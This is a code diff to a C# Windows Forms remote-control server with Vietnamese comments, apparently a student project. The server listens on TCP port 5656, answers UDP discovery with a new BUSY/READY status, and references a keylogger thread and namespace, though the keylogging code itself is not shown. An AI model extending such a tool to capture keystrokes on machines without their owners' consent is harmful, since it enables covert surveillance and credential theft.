@@ -2,27 +2,30 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
-using System.Text;
-using System.Windows.Forms;
+using System.Management;
 using System.Net;
 using System.Net.Sockets;
-using Microsoft.Win32;
-using System.IO;
-using System.Diagnostics;
-using System.Drawing.Imaging;
-using System.Threading;
-using KeyLogger;
 using System.Security;
+using System.Text;
+using System.Threading;
 using System.Timers;
-using System.Management;
+using System.Windows.Forms;
+using KeyLogger;
+using Microsoft.Win32;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
 
 namespace ServerApp
 {
     public partial class server : Form
     {
+        private volatile bool isClientConnected = false;
+
         Thread serverThread; // Luồng chính để chạy Server lắng nghe TCP
         Thread udpDiscoveryThread; // Luồng riêng cho UDP Discovery
         Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
@@ -126,8 +129,8 @@ namespace ServerApp
         // Sự kiện nút "Open Server"
         private void button1_Click(object sender, EventArgs e)
         {
-            ((Button)sender).Enabled = false;
-            ((Button)sender).Text = "Running...";
+            ((System.Windows.Forms.Button)sender).Enabled = false;
+            ((System.Windows.Forms.Button)sender).Text = "Running...";
 
             // Chạy TCP Server trên luồng nền (Port 5656)
             serverThread = new Thread(StartServerLoop);
@@ -154,18 +157,32 @@ namespace ServerApp
                 {
                     try
                     {
-                        // Chấp nhận kết nối từ Client (Python Web Server)
-                        Program.client = Program.server.Accept();
+                        // Server chờ kết nối (Block tại đây)
+                        Socket tempClient = Program.server.Accept();
+
+                        // Nếu đã accept thành công -> Server đang BẬN
+                        isClientConnected = true;
+                        Program.client = tempClient;
+
                         Program.ns = new NetworkStream(Program.client);
                         Program.nr = new StreamReader(Program.ns);
                         Program.nw = new StreamWriter(Program.ns);
-                        Program.nw.AutoFlush = true; // Tự động đẩy dữ liệu đi không cần buffer
+                        Program.nw.AutoFlush = true;
 
-                        // Chuyển sang xử lý lệnh
+                        // Vào vòng lặp xử lý lệnh (Block tại đây cho đến khi Client QUIT hoặc mất kết nối)
                         HandleClientCommunication();
+                    }
+                    catch { 
 
                     }
-                    catch { }
+                    finally
+                    {
+                        // Dù thoát ra vì lý do gì (QUIT hay Crash), hãy đánh dấu là RẢNH
+                        isClientConnected = false;
+
+                        // Đảm bảo đóng socket cũ để tránh lỗi tài nguyên
+                        try { if (Program.client != null) Program.client.Close(); } catch { }
+                    }
                 }
             }
             catch (Exception ex)
@@ -549,12 +566,14 @@ namespace ServerApp
                             
                             // Chọn IP đầu tiên (hoặc có thể chọn IP trong cùng subnet với sender)
                             string serverIp = ipv4Addresses.FirstOrDefault()?.ToString() ?? "Unknown";
-                            
+
                             // === TẠO RESPONSE MESSAGE ===
-                            // Format: "HOSTNAME|IP_ADDRESS"
-                            // Ví dụ: "DESKTOP-ABC123|192.168.1.10"
-                            string response = $"{hostname}|{serverIp}";
-                            
+
+                            // --- LOGIC MỚI: KIỂM TRA TRẠNG THÁI ---
+                            string status = isClientConnected ? "BUSY" : "READY";
+                            // Format: "HOSTNAME|IP_ADDRESS|STATUS"
+                            string response = $"{hostname}|{serverIp}|{status}";
+
                             // Encode string → bytes
                             byte[] responseData = Encoding.UTF8.GetBytes(response);
                             
@@ -587,6 +606,7 @@ namespace ServerApp
                 if (udpServer != null)
                 {
                     udpServer.Close();
+                    udpServer = null;
                 }
             }
         }
